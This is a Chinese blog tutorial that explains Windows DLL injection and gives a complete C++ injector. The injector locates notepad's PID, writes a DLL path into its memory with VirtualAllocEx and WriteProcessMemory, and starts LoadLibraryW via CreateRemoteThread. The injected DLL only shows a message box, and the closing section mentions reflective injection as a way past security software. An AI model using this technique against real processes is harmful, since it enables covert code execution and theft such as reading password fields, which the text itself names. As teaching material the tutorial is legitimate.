👉 文章地址-》CSDN：[扑腾的江鱼](https://blog.csdn.net/weixin_50564032/article/details/128150174)



# 一、DLL 注入概述
* **`DLL 注入`**（英语：DLL injection）是一种涉及计算机信息安全的特殊编程技术。
* 它可以强行使一个 **`进程`** 加载某个 **`动态链接库`** 以在其私有地址空间内运行指定 **`代码`**（往往是恶意代码）。
* **`DLL 注入`** 的常见手段是用外部 DLL 库覆盖一个程序原先的 DLL 库，目的是实现该程序的作者未预期的结果。
* 比如，注入的代码可以 **`挂钩（Hook）`** 系统消息或系统调用，以达到读取密码框的内容等危险目的，而一般编程手段无法达成这些目的。

* 能将任意代码注入任意进程的程序被称为  **`DLL 注入器（DLL injector）`**。
# 二、DLL 注入原理
* Windows 操作系统中，每个进程都有自己 **`独立的 4G 虚拟内存空间`** （保护模式），当程序真正使用时，操作系统才会分配对应的物理内存。
* 也就是 **`不同进程`** 有着自己 **`独立的地址空间`**。
* 例如，对进程 A 中地址 0x1000000 处的数据进行修改，并不会改变进程 B 中地址 0x1000000 处的数据，甚至进程 B 中可能不存在此地址。
* 由于不同进程的地址空间相互独立（保护模式），我们很难编写能够与其它进程通信或控制其它进程的程序。
* DLL 注入即是，存在进程 A、B，使进程 A 中的 dll 文件强行在进程 B 中加载，此时进程 A 的 dll 文件就进入了进程 B 的地址空间，并使进程 B 执行 dll 文件中的代码。

* 由于 dll 文件由恶意程序开发者设计，因此程序开发者可对程序 B（目标进程）进行自定义修改。
		![在这里插入图片描述](https://img-blog.csdnimg.cn/9ea9afe2761542419cfdd8819a90cb0c.png)


# 三、DLL 注入过程
## 1. 生成 DLL 文件

* 创建 dll 项目 ----> 修改 dllmain.cpp ----> 生成解决方案（dll 文件）
	
	
![在这里插入图片描述](https://img-blog.csdnimg.cn/aedddb98839c4700bb2d9e0a5d016f27.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/9ace4ad4e7f9463bacd640c3e0072cd2.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/90dc936648f64df4b77d801f3a298f02.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2d91f44f6a894de38619a1dd33ffb1e0.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b903fb470cbf4d50bc479944a6962c55.png)


```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "stdlib.h"
#include <iostream>

using namespace std;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)

{
	switch (ul_reason_for_call){

		case DLL_PROCESS_ATTACH: {
			// 当DLL被进程 <<第一次>> 调用时，导致DllMain函数被调用，
			HWND hwnd = GetActiveWindow();
			MessageBox(hwnd, L"DLL已进入目标进程。", L"信息", MB_ICONINFORMATION); //弹出一个模态对话框
		}
	}
	return TRUE;
}
```

## 2. 捕获目标进程
* 创建 c++ 项目 ----> 打开目标进程（要注入的进程）----> 获取目标进程 id（pid）

```cpp
//我们注入记事本
system("start %windir%\\system32\\notepad.exe");//打开
```

```cpp
/**
*info ---> 存放快照进程信息的一个结构体
*processName ---> 进程名
* 通过获取系统快照，得到进程列表，通过进程名，遍历进程列表得到 pid
*/
BOOL getProcess32Info(PROCESSENTRY32* info, const TCHAR processName[]){
    HANDLE handle; 
    handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获得系统快照句柄
    
    info->dwSize = sizeof(PROCESSENTRY32);

    Process32First(handle, info);//从快照中获取进程列表
    
    while (Process32Next(handle, info) != FALSE){
        if (wcscmp(processName, info->szExeFile) == 0){
            return TRUE;//找到了
        }
    }
    return FALSE;
}
```

## 3. 在目标进程内分配内存
* 通过 pid 得到进程句柄并获得最高权限 ----> 计算所需空间大小 ----> 对目标进程分配内存
```cpp
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);//返回指定进程的打开句柄，并获得此进程最高权限
if (hProc == 0) return -1;

int pathSize = (wcslen(DllFullPath) + 1) * sizeof(wchar_t);//DllFullPath ---> dll 文件路径 计算所需空间大小

LPVOID buffer = VirtualAllocEx(hProc, 0, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//申请内存
if (buffer == 0) return -2;
```

## 4. 将 DLL 文件添加到目标进程的内存空间

```cpp
if (!WriteProcessMemory(hProc, buffer, DllFullPath, pathSize, NULL)) return -3;//并判断是否成功
```

## 5. 控制进程运行 DLL 文件

* 在目标进程中的开一个线程调用 LoadLibrary() 函数来载入我们想要的DLL 文件程序。

```cpp
//调用Kernel32.dll中的LoadLibraryW方法用以加载DLL文件
LPVOID pFunc = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");

//创建一个在另一个进程的虚拟地址空间中运行的线程
CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)pFunc, buffer, 0, 0);
```

# 四、完整代码
<font color=#999AAA >dllmain.cpp（示例）：

```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"
#include "stdlib.h"
#include <iostream>

using namespace std;

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)

{
	switch (ul_reason_for_call) {

		case DLL_PROCESS_ATTACH: {
			// 当DLL被进程 <<第一次>> 调用时，导致DllMain函数被调用，
			HWND hwnd = GetActiveWindow();
			MessageBox(hwnd, L"DLL已进入目标进程。", L"信息", MB_ICONINFORMATION); //弹出一个模态对话框
		}
	}
	return TRUE;
}
```

<font color=#999AAA >注入器代码（示例）：

```cpp
#include <windows.h>
#include <iostream>
#include <Tlhelp32.h>
#include <stdio.h>
#include <tchar.h>

using namespace std;

BOOL getProcess32Info(PROCESSENTRY32 *info, const TCHAR processName[]) {
    HANDLE handle;
    handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    info->dwSize = sizeof(PROCESSENTRY32);

    Process32First(handle, info);


    while (Process32Next(handle, info) != FALSE) {
        if (wcscmp(processName, info->szExeFile) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

int InjectDLL(const wchar_t *DllFullPath, const DWORD pid) {

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
    if (hProc == 0) return -1;

    int pathSize = (wcslen(DllFullPath) + 1) * sizeof(wchar_t);

    LPVOID buffer = VirtualAllocEx(hProc, 0, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (buffer == 0) return -2;

    if (!WriteProcessMemory(hProc, buffer, DllFullPath, pathSize, NULL)) return -3;

    LPVOID pFunc = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");

    CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE) pFunc, buffer, 0, 0);
}

int main() {
    system("start %windir%\\system32\\notepad.exe");

    PROCESSENTRY32 info;
    if (getProcess32Info(&info, L"notepad.exe")) {
        InjectDLL(L"E:\\Dll1.dll", info.th32ProcessID);
    } else {
        cout << "查找失败" << endl;
    }
    return 0;
}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/da52c94c880546219fec2f61d310939f.png)
# 五、总结
* 本次 DLL 注入取巧用了 LoadLibrary 
* 一些安全软件对 LoadLibrary 这样的 API 十分敏感，且 DLL 文件本身也容易被检测并被删除

* 要解决这些问题，就需要用到 **`反射型 DLL 注入`**(没做)。

<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
<font color=#FF9900 >关注公众号，感受不同的阅读体验</font>

![请添加图片描述](https://img-blog.csdnimg.cn/96b40e5bd90145ef9effa9742de88115.jpeg)
<hr style=" border:solid; width:100px; height:1px;" color=#000000 size=1">
